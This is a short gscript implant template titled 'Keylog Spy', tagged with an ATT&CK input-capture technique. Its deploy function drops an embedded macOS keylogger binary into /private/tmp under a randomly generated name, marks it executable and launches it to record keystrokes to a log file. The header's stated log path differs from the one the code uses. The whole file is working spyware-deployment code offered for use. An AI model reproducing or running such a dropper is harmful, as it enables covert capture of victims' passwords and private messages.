// Example gscript template
// Title: Keylog Spy
// Author: ahhh
// Purpose: Starts recording keylogs, saves them in /var/log/keystroke.log
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
// Using this keylogger: https://github.com/caseyscarborough/keylogger

//priority:150
//timeout:150
//import:/private/tmp/keylogger.macho


function BeforeDeploy() {
  LogInfo("Starting keylogger spy");
  return true; 
}

function Deploy() {  
  // Drop the sample
  var spy = Asset("keylogger.macho");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 6; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = "/private/tmp/"+name;
  WriteFile(name, spy.fileData, 0755);
  LogInfo("dropped the spy binary here: "+name);
    
  ForkExecuteCommand(name, ["/private/tmp/key.log"]);
  return true;
}

function AfterDeploy() {
  LogInfo("Done keylogger spy");
  return true;
}
